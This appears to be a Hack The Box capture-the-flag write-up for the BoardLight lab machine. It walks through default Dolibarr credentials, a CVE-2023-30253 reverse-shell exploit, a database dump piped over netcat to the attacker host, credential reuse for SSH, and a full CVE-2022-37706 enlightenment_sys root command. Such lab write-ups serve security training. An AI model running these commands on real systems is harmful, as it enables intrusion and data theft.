---
layout: post
title: "HTB: BoardLight"
box: boardlight
img: /img/boardlight/boardlight
author: Andrew Cherney
date: 2024-09-28
tags: htb easy-box linux webapp php binary-exploitation cve season-5
icon: "assets/icons/boardlight.png"
post_description: "From default credentials and a service specific CVE to hard coded credentials and a tool CVE, this box is straightforward and can be solved exclusively with simple enumeration."
---

# Summary

{{ page.post_description }}

# Enumeration


```bash
nmap -sC 10.10.11.11

Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-31 17:01 CDT
Nmap scan report for 10.10.11.11
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

```bash
dirsearch -u 10.10.11.11

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Season5/BoardLight/reports/_10.10.11.11/_24-05-31_17-04-23.txt

Target: http://10.10.11.11/

[17:04:23] Starting: 
[17:04:24] 301 -  307B  - /js  ->  http://10.10.11.11/js/
[17:04:29] 403 -  276B  - /.ht_wsr.txt
[17:04:29] 403 -  276B  - /.htaccess.sample
[17:04:29] 403 -  276B  - /.htaccess.orig
[17:04:29] 403 -  276B  - /.htaccess_orig
[17:04:29] 403 -  276B  - /.htaccessBAK
[17:04:29] 403 -  276B  - /.htaccess_sc
[17:04:29] 403 -  276B  - /.htaccess_extra
[17:04:29] 403 -  276B  - /.htaccess.bak1
[17:04:29] 403 -  276B  - /.htpasswd_test
[17:04:29] 403 -  276B  - /.htaccessOLD2
[17:04:29] 403 -  276B  - /.htm
[17:04:29] 403 -  276B  - /.htaccessOLD
[17:04:29] 403 -  276B  - /.htaccess.save
[17:04:29] 403 -  276B  - /.htpasswds
[17:04:29] 403 -  276B  - /.html
[17:04:29] 403 -  276B  - /.httr-oauth
[17:04:32] 403 -  276B  - /.php
[17:04:40] 200 -    2KB - /about.php
[17:05:10] 404 -   16B  - /composer.phar
[17:05:12] 200 -    2KB - /contact.php
[17:05:15] 301 -  308B  - /css  ->  http://10.10.11.11/css/
[17:05:35] 301 -  311B  - /images  ->  http://10.10.11.11/images/
[17:05:35] 403 -  276B  - /images/
[17:05:40] 403 -  276B  - /js/
[17:05:56] 404 -   16B  - /php-cs-fixer.phar
[17:05:56] 403 -  276B  - /php5.fcgi
[17:06:00] 404 -   16B  - /phpunit.phar
[17:06:08] 403 -  276B  - /server-status
[17:06:08] 403 -  276B  - /server-status/
```

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -mc 200,401 -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 118ms]
:: Progress: [114441/114441] :: Job [1/1] :: 451 req/sec :: Duration: [0:04:22] :: Errors: 0 ::
```

Well we've already found a subdomain that likely handles their customer relations. Still worth checking out the front page anyway.

{% include img_link src="/img/boardlight/boardlight_front_page" alt="front_page" ext="png" trunc=600 %}

Yeah nothing out of the ordinary here. Onto `crm.board.htb`.

# www-data

## CVE-2023-30253

![crm login]({{ page.img }}_crm_login_page.png)

Well after some searching the password can be found to be admin:admin, it is of note that admin:changeme123 is another default credential and I am unclear if these were manually set or never changed.

![crm dashboard post login]({{ page.img }}_crm_dashboard.png)

Poking around for the functionality of this dashboard I find out I can create websites, edit HTML, and some other innocuous actions. 

![website create]({{ page.img }}_crm_website_create.png)

[CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py) is the github poc I'll be using. Effectively after creating a website I can place php within a script tag in the html editor and force the editor to dynamically load, allowing me to use php for rce.

```bash
python3 exploit.py http://crm.board.htb admin admin 10.10.14.7 7777

[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
[!] If you have not received the shell, please check your login and password


python3 exploit.py http://crm.board.htb admin admin 10.10.14.7 7777

[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.11 58650
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls   
ls
index.php
styles.css.php

```

# User as larissa

## Reused Creds

So at times like these it's a good idea to look around the sites with login forms as they hold potentially juicy config or database files. I search for a config file within the crm board site to find exactly that.


```bash
www-data@boardlight:~/html/crm.board.htb$ find / -name "conf*" 2>/dev/null

/var/www/html/crm.board.htb/htdocs/conf/conf.php
```

```bash
www-data@boardlight:~/html/crm.board.htb$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
<at /var/www/html/crm.board.htb/htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

Username and password found for the local database. And checking running ports 3306 leans towards mysql. I tried to login but the session froze a couple times so I decided to export the database and read it locally.

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ mysqldump -u dolibarrowner -p dolibarr | nc 10.10.14.7 8888
<p -u dolibarrowner -p dolibarr | nc 10.10.14.7 8888            
Enter password: serverfun2$2023!!
mysqldump: Error: 'Access denied; you need (at least one of) the PROCESS privilege(s) for this operation' when trying to dump tablespaces
```

```bash
nc -nvlp 8888 | tee mysql.dump

Listening on 0.0.0.0 8888
Connection received on 10.10.11.11 47072
-- MySQL dump 10.13  Distrib 8.0.36, for Linux (x86_64)
--
-- Host: localhost    Database: dolibarr
-- ------------------------------------------------------
-- Server version	8.0.36-0ubuntu0.20.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
```

```bash
cat mysql.dump | grep user

INSERT INTO `llx_user` VALUES (1,0,'',NULL,1,1,0,'2024-05-13 13:21:56','2024-05-13 20:21:56',NULL,NULL,'dolibarr',NULL,NULL,'$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm',NULL,NULL,'','','SuperAdmin','','','','',NULL,NULL,NULL,NULL,'','','','','','','','','null',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'','',NULL,'2024-05-15 09:57:04','2024-05-13 23:23:59',NULL,NULL,NULL,'10.10.14.31','10.10.14.41',NULL,'',NULL,1,NULL,NULL,'',NULL,0,'',0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'',NULL),(2,1,'',NULL,0,1,0,'2024-05-13 13:24:01','2024-05-15 16:58:40',NULL,NULL,'admin',NULL,NULL,'$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96',NULL,'yr6V3pXd9QEI',NULL,'','admin','','','','',NULL,NULL,NULL,NULL,'','','','','','','','','[]',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'','',NULL,'2024-05-31 18:14:57','2024-05-31 17:41:01',NULL,NULL,NULL,'10.10.14.7','10.10.14.7',NULL,'',NULL,1,NULL,NULL,'',NULL,0,'',0,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'',NULL);
```

```bash
john hash --wordlist /opt/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)
1g 0:00:00:15 DONE (2024-05-31 21:08) 0.06622g/s 188.3p/s 188.3c/s 188.3C/s Smokey..barnyard
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Hmm, I suppose I could check if the password we have is reused for the user on the system.

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls /home
ls /home
larissa
```

```bash
ssh larissa@board.htb

The authenticity of host 'board.htb (10.10.11.11)' can't be established.
ECDSA key fingerprint is SHA256:cfQmOVNyP7asi/B8DSu3+G5gDhuN37I3cqCQM89psFk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'board.htb,10.10.11.11' (ECDSA) to the list of known hosts.
larissa@board.htb's password: 
Permission denied, please try again.
larissa@board.htb's password: 
Last login: Fri May 31 12:45:28 2024 from 10.10.14.6
larissa@boardlight:~$ cat user.txt 
ddbd9b8dc680d-------------------
```

# Root

## Enlightenment

```bash
larissa@boardlight:~$ find / -user root -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Enlightenment isn't something I normally see on machines, time for some digging. And to save me some typing there is a potential exploit for enlightenment of [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). If you want to read more details on the enlightenment_sys binary exploit I implore you, but below is a shortened version:

When running the binary it will load libraries then check if the first arg is -h or --help. Then it elevates priv to root and unsets all env variables. If the first arg is mount instead it will enter the specific branch which can be exploited. Using UUID=`/dev/../tmp/;/tmp/exploit` another branch can be entered. It is of note this is the payload placement part where any code you wish to run will be at /tmp/exploit. The binary asks for a pointer as the last arguement which expects a length of 6, that can be bypassed to enter a specific directory by entering `/tmp///net`.

Putting all this together the final exploit is adding `/bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), /dev/../tmp/;/tmp/exploit /tmp///net` as parameters for the enlightenment_sys binary. Alternatively use the bash exploit created at the link above. 

```bash
larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
# cat /root/root.txt
a354f1bb5b2d0-------------------
```


